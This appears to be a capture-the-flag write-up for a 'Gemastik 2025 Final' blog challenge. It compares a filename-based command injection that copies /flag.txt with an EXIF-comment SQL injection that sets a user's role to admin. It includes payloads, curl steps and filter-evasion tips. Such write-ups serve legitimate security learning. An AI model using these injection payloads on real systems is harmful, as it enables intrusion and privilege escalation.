# Two Paths to Flag - Quick Comparison

## Yes, You Can Become Admin! 🎯

You asked a great question! There **ARE** two different ways to get the flag:

## Path 1: Command Injection (Easier) ⚡

**What**: Inject shell commands through filename to copy flag to your uploads
**Difficulty**: ⭐⭐⭐☆☆ (Medium)
**Time**: ~2 minutes

```bash
# Quick version
python3 dapur.py <target-ip> <port>
```

**How it works:**

1. Upload legitimate image → get hash
2. Upload image with filename: `x.png; cp /flag.txt /uploads/<hash>.png #.png`
3. Shell executes: copies flag to your image location
4. Download your image → contains flag!

**Pros:**

- ✅ Simpler payload
- ✅ No extra tools needed on attacker machine
- ✅ More reliable
- ✅ Provided solve script works perfectly

**Cons:**

- ❌ Leaves obvious traces (weird filenames)
- ❌ Requires knowing target hash first

---

## Path 2: SQL Injection to Admin (Cooler) 🔐

**What**: Inject SQL through EXIF metadata to become admin
**Difficulty**: ⭐⭐⭐⭐☆ (Medium-Hard)
**Time**: ~5 minutes

```bash
# Step by step
python3 privilege_escalation_exploit.py <target-ip> <port>
```

**How it works:**

1. Create PNG with malicious EXIF: `exiftool -Comment="'; UPDATE users SET role = 'admin'; --" exploit.png`
2. Upload the image
3. SQL injection executes during metadata storage
4. Your user role becomes 'admin'
5. Visit `/profile` → flag displayed directly!

**Pros:**

- ✅ More elegant (direct access to flag)
- ✅ Demonstrates chaining vulnerabilities
- ✅ Cooler technique
- ✅ Less file manipulation needed

**Cons:**

- ❌ Requires exiftool on your machine
- ❌ Slightly more complex
- ❌ May fail if EXIF data is sanitized (doesn't appear to be in this challenge)

---

## Side-by-Side Comparison

| Aspect              | Command Injection       | SQL Injection                          |
| ------------------- | ----------------------- | -------------------------------------- |
| **Target**          | `os.system()` call      | `db.executescript()` call              |
| **Injection Point** | `file.filename`         | EXIF metadata → `metadata_text`        |
| **Payload Example** | `x.png; cp /flag #.png` | `'; UPDATE users SET role='admin'; --` |
| **Tools Needed**    | Python + requests       | Python + requests + exiftool           |
| **Steps**           | 6 steps                 | 4 steps                                |
| **Reliability**     | Very High               | High                                   |
| **Stealth**         | Low (obvious filename)  | Medium (EXIF data)                     |
| **Flag Access**     | Indirect (file copy)    | Direct (profile page)                  |
| **Skill Level**     | Intermediate            | Intermediate-Advanced                  |

---

## The Vulnerable Code

### Command Injection Vulnerability

```python
# app.py:132
cmd = f"exiftool {save_path}"  # save_path contains user filename
os.system(full_cmd)  # Executes in shell: /bin/sh -c "..."
```

### SQL Injection Vulnerability

```python
# app.py:193-194
metadata_insert = f"UPDATE posts SET metadata = '{metadata_text}' WHERE id = {post_id};"
db.executescript(metadata_insert)  # metadata_text from EXIF data
```

---

## Which One Should You Use?

### Use Command Injection if:

- ✅ You want the quickest solution
- ✅ You're in a timed CTF competition
- ✅ You want to use the provided solve script
- ✅ You don't have exiftool installed

### Use SQL Injection if:

- ✅ You want to learn more about SQL injection
- ✅ You prefer direct access to admin features
- ✅ You have exiftool available
- ✅ You want style points 😎

---

## Quick Start Commands

### Method 1: Command Injection (dapur.py)

```bash
cd /home/sandwicheese/ctf-writeups/Gemastik\ 2025\ Final/blogpost/
python3 dapur.py <target-ip> 10000
# Output: GEMASTIK{...}
```

### Method 2: SQL Injection (privilege escalation)

```bash
# Create exploit image
echo -ne '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR' > exploit.png
exiftool -Comment="'; UPDATE users SET role = 'admin' WHERE username = 'hacker'; --" exploit.png

# Register as 'hacker'
curl -X POST http://target:10000/register -d "username=hacker&password=pass123"

# Login
curl -X POST http://target:10000/login -d "username=hacker&password=pass123" -c cookies.txt

# Upload exploit
curl -X POST http://target:10000/create -b cookies.txt \
  -F "title=test" -F "content=test" -F "image=@exploit.png"

# Get flag from profile
curl http://target:10000/profile -b cookies.txt | grep -A2 "FLAG"
```

---

## Pro Tips 💡

### For Command Injection:

1. **Obfuscate paths**: Use `printf '\057'` instead of `/` to bypass filters
2. **Race condition**: The dapur.py script retries multiple times - this is important!
3. **Comment out**: Always end with `#` to comment out trailing parts of the command

### For SQL Injection:

1. **Test EXIF first**: `exiftool exploit.png` to see your Comment field
2. **Quote escaping**: SQLite supports both `'` and `"` for strings
3. **Multiple fields**: Try Comment, Description, UserComment if one doesn't work
4. **Verify role**: After upload, check if role changed before visiting profile

---

## Why This Challenge is Great

This challenge demonstrates **multiple real-world vulnerabilities** that are often found together:

1. ✅ **Command Injection** - Common in file upload handlers
2. ✅ **SQL Injection** - Still prevalent in many applications
3. ✅ **Path Traversal** attempts (defended in this case)
4. ✅ **Authorization issues** (flag behind admin role)

The lesson: **Defense in depth matters!** One vulnerability is bad, but multiple make it even worse.

---

## Full Documentation

- **[PRIVILEGE_ESCALATION.md](PRIVILEGE_ESCALATION.md)** - Complete SQL injection guide with exploit script
- **[VULNERABILITY_ANALYSIS.md](VULNERABILITY_ANALYSIS.md)** - Deep dive into all vulnerabilities
- **[ATTACK_FLOW.md](ATTACK_FLOW.md)** - Visual diagrams of attack paths
- **[QUICK_REFERENCE.md](QUICK_REFERENCE.md)** - Quick commands and payloads
- **[README.md](README.md)** - Full writeup

---

## TL;DR

**Want flag fast?** → Use `dapur.py` (command injection)  
**Want to learn more?** → Try SQL injection to become admin  
**Want both?** → Do command injection first, then try SQL injection for fun!

Both work. Both are cool. Pick your poison! 🎯

